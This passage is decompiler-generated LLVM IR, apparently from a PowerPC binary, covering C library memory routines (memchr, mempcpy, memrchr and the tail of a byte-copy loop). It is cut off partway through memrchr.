  %v2_10012b50 = phi i32 [ %v3_10012b50, %dec_label_pc_10012b4c ], [ %v2_10012b50.pre, %dec_label_pc_10012b48 ]
  %v0_10012b4c = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b4c = add i32 %v0_10012b4c, -1
  %v2_10012b4c = inttoptr i32 %v1_10012b4c to i8*
  %v3_10012b4c = load i8, i8* %v2_10012b4c, align 1
  store i32 %v1_10012b4c, i32* %r4.global-to-local, align 4
  %v3_10012b50 = add i32 %v2_10012b50, -1
  %v4_10012b50 = inttoptr i32 %v3_10012b50 to i8*
  store i8 %v3_10012b4c, i8* %v4_10012b50, align 1
  store i32 %v3_10012b50, i32* %r10.global-to-local, align 4
  %v0_10012b54 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b54 = add i32 %v0_10012b54, -1
  store i32 %v1_10012b54, i32* %ctr.global-to-local, align 4
  %v2_10012b54 = icmp eq i32 %v1_10012b54, 0
  br i1 %v2_10012b54, label %dec_label_pc_10012b80, label %dec_label_pc_10012b4c

dec_label_pc_10012b5c:                            ; preds = %dec_label_pc_10012b08
  %v1_10012b5c = sub nsw i32 4, %v1_10012b08
  store i32 %v1_10012b5c, i32* %ctr.global-to-local, align 4
  %v2_10012b64 = sub i32 %v1_10012afc, %v1_10012b5c
  store i32 %v2_10012b64, i32* @r11, align 4
  %v1_10012b689 = add i32 %v2_10012afc, -1
  %v2_10012b6810 = inttoptr i32 %v1_10012b689 to i8*
  %v3_10012b6811 = load i8, i8* %v2_10012b6810, align 1
  store i32 %v1_10012b689, i32* %r4.global-to-local, align 4
  %v3_10012b6c13 = add i32 %v2_10012b00, -1
  %v4_10012b6c14 = inttoptr i32 %v3_10012b6c13 to i8*
  store i8 %v3_10012b6811, i8* %v4_10012b6c14, align 1
  store i32 %v3_10012b6c13, i32* %r10.global-to-local, align 4
  %v0_10012b7015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b7016 = add i32 %v0_10012b7015, -1
  store i32 %v1_10012b7016, i32* %ctr.global-to-local, align 4
  %v2_10012b7017 = icmp eq i32 %v1_10012b7016, 0
  br i1 %v2_10012b7017, label %dec_label_pc_10012b74, label %dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge

dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge: ; preds = %dec_label_pc_10012b5c, %dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge
  %v3_10012b6c18 = phi i32 [ %v3_10012b6c, %dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge ], [ %v3_10012b6c13, %dec_label_pc_10012b5c ]
  %v0_10012b68.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b68 = add i32 %v0_10012b68.pre, -1
  %v2_10012b68 = inttoptr i32 %v1_10012b68 to i8*
  %v3_10012b68 = load i8, i8* %v2_10012b68, align 1
  store i32 %v1_10012b68, i32* %r4.global-to-local, align 4
  %v3_10012b6c = add i32 %v3_10012b6c18, -1
  %v4_10012b6c = inttoptr i32 %v3_10012b6c to i8*
  store i8 %v3_10012b68, i8* %v4_10012b6c, align 1
  store i32 %v3_10012b6c, i32* %r10.global-to-local, align 4
  %v0_10012b70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b70 = add i32 %v0_10012b70, -1
  store i32 %v1_10012b70, i32* %ctr.global-to-local, align 4
  %v2_10012b70 = icmp eq i32 %v1_10012b70, 0
  br i1 %v2_10012b70, label %dec_label_pc_10012b74, label %dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge

dec_label_pc_10012b74:                            ; preds = %dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge, %dec_label_pc_10012b5c
  %v0_10012b74 = load i32, i32* @r11, align 4
  %v1_10012b74 = call i32 @__asm_rlwinm.(i32 %v0_10012b74, i32 29, i32 3, i32 31)
  store i32 %v1_10012b74, i32* %r9.global-to-local, align 4
  %v4_10012b74 = icmp eq i32 %v1_10012b74, 0
  br i1 %v4_10012b74, label %dec_label_pc_10012b28, label %dec_label_pc_10012b74.dec_label_pc_10012b10_crit_edge

dec_label_pc_10012b74.dec_label_pc_10012b10_crit_edge: ; preds = %dec_label_pc_10012b74
  %v1_10012b1c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012b10

dec_label_pc_10012b80:                            ; preds = %dec_label_pc_10012b4c, %dec_label_pc_10012b40
  %v0_10012b80 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10012b80

; uselistorder directives
  uselistorder i32 %v1_10012b74, { 1, 2, 0 }
  uselistorder i32 %v1_10012b70, { 1, 0 }
  uselistorder i32 %v3_10012b6c, { 1, 2, 0 }
  uselistorder i32 %v1_10012b54, { 1, 0 }
  uselistorder i32 %v3_10012b50, { 1, 2, 0 }
  uselistorder i32 %v1_10012b28, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10012b24, { 1, 0 }
  uselistorder i32 %v2_10012b20, { 1, 2, 0 }
  uselistorder i32 %v1_10012b08, { 1, 0 }
  uselistorder i32 %v2_10012b00, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10012afc, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 3, 4, 2, 8, 1, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10012b68.dec_label_pc_10012b68_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10012b40, { 1, 0 }
  uselistorder label %dec_label_pc_10012b28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012af8, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10012b8c = urem i32 %arg1, 256
  store i32 %v1_10012b8c, i32* %r4.global-to-local, align 4
  %v0_10012bac7 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_10012bb013 = icmp eq i32 %arg2, 0
  br i1 %v2_10012bb013, label %dec_label_pc_10012bb8, label %dec_label_pc_10012bb4

dec_label_pc_10012b98:                            ; preds = %dec_label_pc_10012bb4
  %v1_10012b98 = inttoptr i32 %v0_10012b98 to i8*
  %v2_10012b98 = load i8, i8* %v1_10012b98, align 1
  %v3_10012b98 = zext i8 %v2_10012b98 to i32
  %v0_10012b9c = load i32, i32* %r5.global-to-local, align 4
  %v1_10012b9c = add i32 %v0_10012b9c, -1
  store i32 %v1_10012b9c, i32* %r5.global-to-local, align 4
  %v1_10012ba0 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012ba0 = icmp eq i32 %v3_10012b98, %v1_10012ba0
  %v0_10012ba4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012ba0, i32 %v0_10012ba4)
  %v0_10012ba8 = load i32, i32* @r3, align 4
  %v1_10012ba8 = add i32 %v0_10012ba8, 1
  store i32 %v1_10012ba8, i32* @r3, align 4
  %v0_10012bb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012bb0 = add i32 %v0_10012bb0, -1
  store i32 %v1_10012bb0, i32* %ctr.global-to-local, align 4
  %v2_10012bb0 = icmp eq i32 %v1_10012bb0, 0
  br i1 %v2_10012bb0, label %dec_label_pc_10012bb8.loopexit, label %dec_label_pc_10012bb4

dec_label_pc_10012bb4:                            ; preds = %entry, %dec_label_pc_10012b98
  %v0_10012b98 = phi i32 [ %v1_10012ba8, %dec_label_pc_10012b98 ], [ %v0_10012bac7, %entry ]
  %v0_10012bb4.in.in = phi i32 [ %v1_10012ba8, %dec_label_pc_10012b98 ], [ %v0_10012bac7, %entry ]
  %v0_10012bb4.in = urem i32 %v0_10012bb4.in.in, 4
  %v0_10012bb4 = icmp eq i32 %v0_10012bb4.in, 0
  br i1 %v0_10012bb4, label %dec_label_pc_10012bb8.loopexit, label %dec_label_pc_10012b98

dec_label_pc_10012bb8.loopexit:                   ; preds = %dec_label_pc_10012bb4, %dec_label_pc_10012b98
  %v0_10012be016.ph = phi i32 [ %v1_10012ba8, %dec_label_pc_10012b98 ], [ %v0_10012b98, %dec_label_pc_10012bb4 ]
  %v0_10012bb8.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10012bbc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012bb8

dec_label_pc_10012bb8:                            ; preds = %dec_label_pc_10012bb8.loopexit, %entry
  %v0_10012bbc = phi i32 [ 0, %entry ], [ %v0_10012bbc.pre, %dec_label_pc_10012bb8.loopexit ]
  %v0_10012bb8 = phi i32 [ %v1_10012b8c, %entry ], [ %v0_10012bb8.pre, %dec_label_pc_10012bb8.loopexit ]
  %v0_10012be016 = phi i32 [ %v0_10012bac7, %entry ], [ %v0_10012be016.ph, %dec_label_pc_10012bb8.loopexit ]
  %v1_10012bb8 = mul i32 %v0_10012bb8, 256
  %v1_10012bbc = udiv i32 %v0_10012bbc, 4
  %v2_10012bc0 = or i32 %v1_10012bb8, %v0_10012bb8
  %v1_10012bc8 = mul i32 %v2_10012bc0, 65536
  %v2_10012bd4 = or i32 %v1_10012bc8, %v2_10012bc0
  store i32 %v1_10012bbc, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10012bbc, 4
  br i1 %tmp, label %dec_label_pc_10012c68, label %dec_label_pc_10012be0

dec_label_pc_10012be0:                            ; preds = %dec_label_pc_10012bb8, %dec_label_pc_10012c64.backedge
  %v0_10012c64 = phi i32 [ %v1_10012c64, %dec_label_pc_10012c64.backedge ], [ %v1_10012bbc, %dec_label_pc_10012bb8 ]
  %v0_10012be8 = phi i32 [ %v1_10012be8, %dec_label_pc_10012c64.backedge ], [ %v0_10012bbc, %dec_label_pc_10012bb8 ]
  %v0_10012c20 = phi i32 [ %v1_10012be4, %dec_label_pc_10012c64.backedge ], [ %v0_10012be016, %dec_label_pc_10012bb8 ]
  %v1_10012be0 = inttoptr i32 %v0_10012c20 to i32*
  %v2_10012be0 = load i32, i32* %v1_10012be0, align 4
  %v1_10012be4 = add i32 %v0_10012c20, 4
  store i32 %v1_10012be4, i32* @r3, align 4
  %v1_10012be8 = add i32 %v0_10012be8, -4
  store i32 %v1_10012be8, i32* %r5.global-to-local, align 4
  %v1_10012bec = add i32 %v0_10012c20, 1
  %v2_10012bf0 = xor i32 %v2_10012be0, %v2_10012bd4
  %v1_10012bf8 = add i32 %v2_10012bf0, 2130640639
  %v2_10012bfc = xor i32 %v1_10012bf8, %v2_10012bf0
  %v2_10012c00 = and i32 %v2_10012bfc, -2130640640
  %v6_10012c00 = icmp eq i32 %v2_10012c00, -2130640640
  br i1 %v6_10012c00, label %dec_label_pc_10012c64.backedge, label %dec_label_pc_10012c0c

dec_label_pc_10012c64.backedge:                   ; preds = %dec_label_pc_10012be0, %dec_label_pc_10012c50
  %v1_10012c64 = add i32 %v0_10012c64, -1
  store i32 %v1_10012c64, i32* %ctr.global-to-local, align 4
  %v2_10012c64 = icmp eq i32 %v1_10012c64, 0
  br i1 %v2_10012c64, label %dec_label_pc_10012c68, label %dec_label_pc_10012be0

dec_label_pc_10012c0c:                            ; preds = %dec_label_pc_10012be0
  %v2_10012c0c = inttoptr i32 %v0_10012c20 to i8*
  %v3_10012c0c = load i8, i8* %v2_10012c0c, align 1
  %v4_10012c0c = zext i8 %v3_10012c0c to i32
  %v1_10012c10 = add i32 %v0_10012c20, 3
  %v1_10012c14 = add i32 %v0_10012c20, 2
  %v4_10012c18 = icmp eq i32 %v4_10012c0c, %v0_10012bb8
  br i1 %v4_10012c18, label %dec_label_pc_10012c20, label %dec_label_pc_10012c28

dec_label_pc_10012c20:                            ; preds = %dec_label_pc_10012c0c
  ret i32 %v0_10012c20

dec_label_pc_10012c28:                            ; preds = %dec_label_pc_10012c0c
  %v2_10012c28 = inttoptr i32 %v1_10012bec to i8*
  %v3_10012c28 = load i8, i8* %v2_10012c28, align 1
  %v4_10012c28 = zext i8 %v3_10012c28 to i32
  %v4_10012c2c = icmp eq i32 %v4_10012c28, %v0_10012bb8
  br i1 %v4_10012c2c, label %dec_label_pc_10012c34, label %dec_label_pc_10012c3c

dec_label_pc_10012c34:                            ; preds = %dec_label_pc_10012c28
  ret i32 %v1_10012bec

dec_label_pc_10012c3c:                            ; preds = %dec_label_pc_10012c28
  %v2_10012c3c = inttoptr i32 %v1_10012c14 to i8*
  %v3_10012c3c = load i8, i8* %v2_10012c3c, align 1
  %v4_10012c3c = zext i8 %v3_10012c3c to i32
  %v4_10012c40 = icmp eq i32 %v4_10012c3c, %v0_10012bb8
  br i1 %v4_10012c40, label %dec_label_pc_10012c48, label %dec_label_pc_10012c50

dec_label_pc_10012c48:                            ; preds = %dec_label_pc_10012c3c
  ret i32 %v1_10012c14

dec_label_pc_10012c50:                            ; preds = %dec_label_pc_10012c3c
  %v2_10012c50 = inttoptr i32 %v1_10012c10 to i8*
  %v3_10012c50 = load i8, i8* %v2_10012c50, align 1
  %v4_10012c50 = zext i8 %v3_10012c50 to i32
  %v4_10012c54 = icmp eq i32 %v4_10012c50, %v0_10012bb8
  br i1 %v4_10012c54, label %dec_label_pc_10012c5c, label %dec_label_pc_10012c64.backedge

dec_label_pc_10012c5c:                            ; preds = %dec_label_pc_10012c50
  ret i32 %v1_10012c10

dec_label_pc_10012c68:                            ; preds = %dec_label_pc_10012c64.backedge, %dec_label_pc_10012bb8
  %v0_10012c7426 = phi i32 [ %v0_10012be016, %dec_label_pc_10012bb8 ], [ %v1_10012be4, %dec_label_pc_10012c64.backedge ]
  %v0_10012c68 = phi i32 [ %v0_10012bbc, %dec_label_pc_10012bb8 ], [ %v1_10012be8, %dec_label_pc_10012c64.backedge ]
  %v1_10012c68 = add i32 %v0_10012c68, 1
  store i32 %v1_10012c68, i32* %r5.global-to-local, align 4
  store i32 %v0_10012c68, i32* %ctr.global-to-local, align 4
  %v2_10012c843 = icmp eq i32 %v0_10012c68, 0
  br i1 %v2_10012c843, label %dec_label_pc_10012c88, label %dec_label_pc_10012c74

dec_label_pc_10012c74:                            ; preds = %dec_label_pc_10012c68, %dec_label_pc_10012c74.dec_label_pc_10012c74_crit_edge
  %v1_10012c78 = phi i32 [ %v1_10012c78.pre, %dec_label_pc_10012c74.dec_label_pc_10012c74_crit_edge ], [ %v0_10012bb8, %dec_label_pc_10012c68 ]
  %v0_10012c74 = phi i32 [ %v1_10012c80, %dec_label_pc_10012c74.dec_label_pc_10012c74_crit_edge ], [ %v0_10012c7426, %dec_label_pc_10012c68 ]
  %v1_10012c74 = inttoptr i32 %v0_10012c74 to i8*
  %v2_10012c74 = load i8, i8* %v1_10012c74, align 1
  %v3_10012c74 = zext i8 %v2_10012c74 to i32
  %v4_10012c78 = icmp eq i32 %v3_10012c74, %v1_10012c78
  %v0_10012c7c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012c78, i32 %v0_10012c7c)
  %v0_10012c80 = load i32, i32* @r3, align 4
  %v1_10012c80 = add i32 %v0_10012c80, 1
  store i32 %v1_10012c80, i32* @r3, align 4
  %v0_10012c84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012c84 = add i32 %v0_10012c84, -1
  store i32 %v1_10012c84, i32* %ctr.global-to-local, align 4
  %v2_10012c84 = icmp eq i32 %v1_10012c84, 0
  br i1 %v2_10012c84, label %dec_label_pc_10012c88, label %dec_label_pc_10012c74.dec_label_pc_10012c74_crit_edge

dec_label_pc_10012c74.dec_label_pc_10012c74_crit_edge: ; preds = %dec_label_pc_10012c74
  %v1_10012c78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012c74

dec_label_pc_10012c88:                            ; preds = %dec_label_pc_10012c74, %dec_label_pc_10012c68
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10012c84, { 1, 0 }
  uselistorder i32 %v1_10012c80, { 1, 0 }
  uselistorder i32 %v0_10012c68, { 1, 2, 0 }
  uselistorder i32 %v1_10012c64, { 2, 1, 0 }
  uselistorder i32 %v1_10012be8, { 0, 2, 1 }
  uselistorder i32 %v1_10012be4, { 0, 2, 1 }
  uselistorder i32 %v0_10012c20, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10012bc0, { 1, 0 }
  uselistorder i32 %v1_10012bbc, { 1, 0 }
  uselistorder i32 %v0_10012be016, { 1, 0 }
  uselistorder i32 %v0_10012bb8, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10012bbc, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10012bb0, { 1, 0 }
  uselistorder i32 %v1_10012ba8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10012bac7, { 2, 0, 1 }
  uselistorder i32 %v1_10012b8c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012c74, { 1, 0 }
  uselistorder label %dec_label_pc_10012c64.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10012be0, { 1, 0 }
  uselistorder label %dec_label_pc_10012bb4, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268512428, i32* @lr, align 4
  %v0_10012ca8 = call i32 @memcpy()
  %v0_10012cb0 = load i32, i32* @r28, align 4
  %v1_10012cb0 = load i32, i32* @r29, align 4
  %v2_10012cb0 = add i32 %v1_10012cb0, %v0_10012cb0
  ret i32 %v2_10012cb0
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10012cc8 = urem i32 %arg2, 256
  store i32 %v1_10012cc8, i32* %r4.global-to-local, align 4
  %v2_10012cd0 = add i32 %arg3, %arg1
  store i32 %v2_10012cd0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_10012cec13 = icmp eq i32 %arg3, 0
  br i1 %v2_10012cec13, label %dec_label_pc_10012cf4, label %dec_label_pc_10012cf0

dec_label_pc_10012cd8:                            ; preds = %dec_label_pc_10012cf0
  %v1_10012cd8 = add i32 %v0_10012cd8, -1
  %v2_10012cd8 = inttoptr i32 %v1_10012cd8 to i8*
  %v3_10012cd8 = load i8, i8* %v2_10012cd8, align 1
  %v4_10012cd8 = zext i8 %v3_10012cd8 to i32
  store i32 %v1_10012cd8, i32* %r3.global-to-local, align 4
  %v0_10012cdc = load i32, i32* %r5.global-to-local, align 4
  %v1_10012cdc = add i32 %v0_10012cdc, -1
  store i32 %v1_10012cdc, i32* %r5.global-to-local, align 4
  %v1_10012ce0 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012ce0 = icmp eq i32 %v4_10012cd8, %v1_10012ce0
  %v0_10012ce4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012ce0, i32 %v0_10012ce4)
  %v0_10012ce8 = load i32, i32* %r3.global-to-local, align 4
  %v0_10012cec = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012cec = add i32 %v0_10012cec, -1
  store i32 %v1_10012cec, i32* %ctr.global-to-local, align 4
  %v2_10012cec = icmp eq i32 %v1_10012cec, 0
  br i1 %v2_10012cec, label %dec_label_pc_10012cf4.loopexit, label %dec_label_pc_10012cf0

dec_label_pc_10012cf0:                            ; preds = %entry, %dec_label_pc_10012cd8
  %v0_10012cd8 = phi i32 [ %v0_10012ce8, %dec_label_pc_10012cd8 ], [ %v2_10012cd0, %entry ]
  %v0_10012cf0.in.in = phi i32 [ %v0_10012ce8, %dec_label_pc_10012cd8 ], [ %v2_10012cd0, %entry ]
  %v0_10012cf0.in = urem i32 %v0_10012cf0.in.in, 4
  %v0_10012cf0 = icmp eq i32 %v0_10012cf0.in, 0
  br i1 %v0_10012cf0, label %dec_label_pc_10012cf4.loopexit, label %dec_label_pc_10012cd8

dec_label_pc_10012cf4.loopexit:                   ; preds = %dec_label_pc_10012cf0, %dec_label_pc_10012cd8
  %v0_10012d1c16.ph = phi i32 [ %v0_10012ce8, %dec_label_pc_10012cd8 ], [ %v0_10012cd8, %dec_label_pc_10012cf0 ]
  %v0_10012cf4.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10012cf8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012cf4

dec_label_pc_10012cf4:                            ; preds = %dec_label_pc_10012cf4.loopexit, %entry
  %v0_10012cf8 = phi i32 [ 0, %entry ], [ %v0_10012cf8.pre, %dec_label_pc_10012cf4.loopexit ]
  %v0_10012cf4 = phi i32 [ %v1_10012cc8, %entry ], [ %v0_10012cf4.pre, %dec_label_pc_10012cf4.loopexit ]
  %v0_10012d1c16 = phi i32 [ %v2_10012cd0, %entry ], [ %v0_10012d1c16.ph, %dec_label_pc_10012cf4.loopexit ]
  %v1_10012cf4 = mul i32 %v0_10012cf4, 256
  %v1_10012cf8 = udiv i32 %v0_10012cf8, 4
  %v2_10012cfc = or i32 %v1_10012cf4, %v0_10012cf4
  %v1_10012d04 = mul i32 %v2_10012cfc, 65536
  %v2_10012d10 = or i32 %v1_10012d04, %v2_10012cfc
  store i32 %v2_10012d10, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_10012cf8, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10012cf8, 4
  br i1 %tmp, label %dec_label_pc_10012d94, label %dec_label_pc_10012d1c

dec_label_pc_10012d1c:                            ; preds = %dec_label_pc_10012cf4, %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge
  %v0_10012d9021 = phi i32 [ %v1_10012d90, %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge ], [ %v1_10012cf8, %dec_label_pc_10012cf4 ]
  %v0_10012d3c = phi i32 [ %v0_10012d3c.pre, %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge ], [ -2130640640, %dec_label_pc_10012cf4 ]
  %v0_10012d24 = phi i32 [ %v0_10012d24.pre, %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge ], [ %v2_10012d10, %dec_label_pc_10012cf4 ]
  %v0_10012d20 = phi i32 [ %v0_10012d20.pre, %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge ], [ %v0_10012cf8, %dec_label_pc_10012cf4 ]
  %v0_10012d1c = phi i32 [ %v0_10012d1c.pre, %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge ], [ %v0_10012d1c16, %dec_label_pc_10012cf4 ]
  %v1_10012d1c = add i32 %v0_10012d1c, -4
  %v2_10012d1c = inttoptr i32 %v1_10012d1c to i32*
  %v3_10012d1c = load i32, i32* %v2_10012d1c, align 4
  store i32 %v1_10012d1c, i32* %r3.global-to-local, align 4
  %v1_10012d20 = add i32 %v0_10012d20, -4
  store i32 %v1_10012d20, i32* %r5.global-to-local, align 4
  %v2_10012d24 = xor i32 %v3_10012d1c, %v0_10012d24
  %v1_10012d28 = add i32 %v0_10012d1c, -3
  %v1_10012d30 = add i32 %v2_10012d24, 2130640639
  %v1_10012d38 = add i32 %v0_10012d1c, -2
  %v2_10012d34 = sub i32 -1, %v2_10012d24
  %v2_10012d3c = xor i32 %v1_10012d30, %v2_10012d34
  %v3_10012d3c = and i32 %v2_10012d3c, %v0_10012d3c
  %v6_10012d3c = icmp eq i32 %v3_10012d3c, 0
  %v1_10012d40 = add i32 %v0_10012d1c, -1
  br i1 %v6_10012d3c, label %dec_label_pc_10012d90.backedge, label %dec_label_pc_10012d48

dec_label_pc_10012d48:                            ; preds = %dec_label_pc_10012d1c
  %v2_10012d48 = inttoptr i32 %v1_10012d40 to i8*
  %v3_10012d48 = load i8, i8* %v2_10012d48, align 1
  %v4_10012d48 = zext i8 %v3_10012d48 to i32
  %v1_10012d4c = load i32, i32* %r4.global-to-local, align 4
  %v4_10012d4c = icmp eq i32 %v4_10012d48, %v1_10012d4c
  br i1 %v4_10012d4c, label %dec_label_pc_10012d54, label %dec_label_pc_10012d5c

dec_label_pc_10012d54:                            ; preds = %dec_label_pc_10012d48
  store i32 %v1_10012d40, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012d40

dec_label_pc_10012d5c:                            ; preds = %dec_label_pc_10012d48
  %v2_10012d5c = inttoptr i32 %v1_10012d38 to i8*
  %v3_10012d5c = load i8, i8* %v2_10012d5c, align 1
  %v4_10012d5c = zext i8 %v3_10012d5c to i32
  %v4_10012d60 = icmp eq i32 %v4_10012d5c, %v1_10012d4c
  br i1 %v4_10012d60, label %dec_label_pc_10012d68, label %dec_label_pc_10012d70

dec_label_pc_10012d68:                            ; preds = %dec_label_pc_10012d5c
  store i32 %v1_10012d38, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012d38

dec_label_pc_10012d70:                            ; preds = %dec_label_pc_10012d5c
  %v2_10012d70 = inttoptr i32 %v1_10012d28 to i8*
  %v3_10012d70 = load i8, i8* %v2_10012d70, align 1
  %v4_10012d70 = zext i8 %v3_10012d70 to i32
  %v4_10012d74 = icmp eq i32 %v4_10012d70, %v1_10012d4c
  br i1 %v4_10012d74, label %dec_label_pc_10012d7c, label %dec_label_pc_10012d84

dec_label_pc_10012d7c:                            ; preds = %dec_label_pc_10012d70
  store i32 %v1_10012d28, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012d28

dec_label_pc_10012d84:                            ; preds = %dec_label_pc_10012d70
  %v1_10012d84 = inttoptr i32 %v1_10012d1c to i8*
  %v2_10012d84 = load i8, i8* %v1_10012d84, align 1
  %v3_10012d84 = zext i8 %v2_10012d84 to i32
  %v4_10012d88 = icmp eq i32 %v3_10012d84, %v1_10012d4c
  %v0_10012d8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012d88, i32 %v0_10012d8c)
  %v0_10012d90.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012d90.backedge

dec_label_pc_10012d90.backedge:                   ; preds = %dec_label_pc_10012d84, %dec_label_pc_10012d1c
  %v0_10012d90 = phi i32 [ %v0_10012d90.pre, %dec_label_pc_10012d84 ], [ %v0_10012d9021, %dec_label_pc_10012d1c ]
  %v1_10012d90 = add i32 %v0_10012d90, -1
  store i32 %v1_10012d90, i32* %ctr.global-to-local, align 4
  %v2_10012d90 = icmp eq i32 %v1_10012d90, 0
  br i1 %v2_10012d90, label %dec_label_pc_10012d90.dec_label_pc_10012d94_crit_edge, label %dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge

dec_label_pc_10012d90.backedge.dec_label_pc_10012d1c_crit_edge: ; preds = %dec_label_pc_10012d90.backedge
  %v0_10012d1c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10012d20.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10012d24.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10012d3c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012d1c

dec_label_pc_10012d90.dec_label_pc_10012d94_crit_edge: ; preds = %dec_label_pc_10012d90.backedge
  %v0_10012d94.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012d94

dec_label_pc_10012d94:                            ; preds = %dec_label_pc_10012d90.dec_label_pc_10012d94_crit_edge, %dec_label_pc_10012cf4
  %v0_10012d94 = phi i32 [ %v0_10012d94.pre, %dec_label_pc_10012d90.dec_label_pc_10012d94_crit_edge ], [ %v0_10012cf8, %dec_label_pc_10012cf4 ]
  %v1_10012d94 = add i32 %v0_10012d94, 1
  store i32 %v1_10012d94, i32* %r5.global-to-local, align 4
  store i32 %v0_10012d94, i32* %ctr.global-to-local, align 4
  %v2_10012dac3 = icmp eq i32 %v0_10012d94, 0
  br i1 %v2_10012dac3, label %dec_label_pc_10012db0, label %dec_label_pc_10012da0

dec_label_pc_10012da0:                            ; preds = %dec_label_pc_10012d94, %dec_label_pc_10012da0
  %v0_10012da0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012da0 = add i32 %v0_10012da0, -1
  %v2_10012da0 = inttoptr i32 %v1_10012da0 to i8*
  %v3_10012da0 = load i8, i8* %v2_10012da0, align 1
  %v4_10012da0 = zext i8 %v3_10012da0 to i32
  store i32 %v1_10012da0, i32* %r3.global-to-local, align 4
  %v1_10012da4 = load i32, i32* %r4.global-to-local, align 4
